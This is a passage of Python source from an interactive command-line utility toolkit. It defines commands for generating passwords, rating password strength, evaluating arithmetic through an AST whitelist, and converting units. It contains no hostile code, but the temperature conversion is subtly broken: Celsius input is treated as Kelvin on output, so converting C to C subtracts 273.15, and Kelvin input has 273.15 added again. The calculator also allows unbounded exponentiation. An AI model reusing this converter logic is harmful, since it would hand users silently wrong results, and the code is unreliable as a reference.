    length = int(ctx["ask"]("Length", "16"))
    use_symbols = ctx["confirm"]("Include symbols?", True)
    alphabet = string.ascii_letters + string.digits + (string.punctuation if use_symbols else "")
    pwd = "".join(secrets.choice(alphabet) for _ in range(length))
    ctx["console"].print(f"[{ctx['theme'].primary}]{pwd}[/]")
    if ctx["confirm"]("Copy to clipboard?", False):
        cmd = "pbcopy" if sys.platform == "darwin" else ("xclip -selection clipboard" if shutil.which("xclip") else None)
        if cmd:
            subprocess.Popen(cmd.split(), stdin=subprocess.PIPE).communicate(pwd.encode())
        else:
            ctx["console"].print("[yellow]No clipboard tool found.[/]")


def cmd_strength(ctx):
    pwd = getpass.getpass("Password: ")
    pool = 0
    if re.search(r"[a-z]", pwd): pool += 26
    if re.search(r"[A-Z]", pwd): pool += 26
    if re.search(r"\d", pwd): pool += 10
    if re.search(r"[^A-Za-z0-9]", pwd): pool += 32
    entropy = len(pwd) * (math.log2(pool) if pool else 0)
    label = "weak" if entropy < 40 else "fair" if entropy < 60 else "strong" if entropy < 90 else "excellent"
    ctx["console"].print(f"Length {len(pwd)} · pool {pool} · entropy {entropy:.1f} bits · {label}")


def cmd_calculator(ctx):
    expr = ctx["ask"]("Expression (e.g. 2*(3+4)/5)", "1+1")
    try:
        tree = ast.parse(expr, mode="eval")
        allowed = (ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant, ast.Num,
                   ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod,
                   ast.Pow, ast.USub, ast.UAdd)
        for n in ast.walk(tree):
            if not isinstance(n, allowed):
                raise ValueError(f"Disallowed expression node: {type(n).__name__}")
        result = eval(compile(tree, "<calc>", "eval"))
        ctx["console"].print(f"[{ctx['theme'].primary}]{expr} = {result}[/]")
    except (ValueError, SyntaxError, ZeroDivisionError) as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Bad expression: {exc}[/]")


def cmd_unit_convert(ctx):
    category = ctx["choose"]("Category", ["Length", "Mass", "Temperature", "Bytes"]) or "Length"
    value = float(ctx["ask"]("Value", "1"))
    if category == "Length":
        units = {"m": 1.0, "cm": 0.01, "mm": 0.001, "km": 1000.0, "inch": 0.0254, "ft": 0.3048, "mile": 1609.34}
    elif category == "Mass":
        units = {"kg": 1.0, "g": 0.001, "mg": 1e-6, "lb": 0.45359237, "oz": 0.0283495231}
    elif category == "Bytes":
        units = {"B": 1, "KB": 1024, "MB": 1024**2, "GB": 1024**3, "TB": 1024**4, "PB": 1024**5}
    else:
        units = {"C": (lambda v: v), "F": (lambda v: v * 9/5 + 32), "K": (lambda v: v + 273.15)}
    src = ctx["choose"]("From", list(units.keys()))
    dst = ctx["choose"]("To", list(units.keys()))
    try:
        if category == "Temperature":
            base = units[src](value) if src != "F" else (value - 32) * 5/9
            result = (base - 273.15) if dst == "C" else (base * 9/5 - 459.67) if dst == "F" else base
        else:
            base = value * units[src]
            result = base / units[dst]
        ctx["console"].print(f"{value} {src} = {result:.6g} {dst}")
    except Exception as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Conversion failed: {exc}[/]")


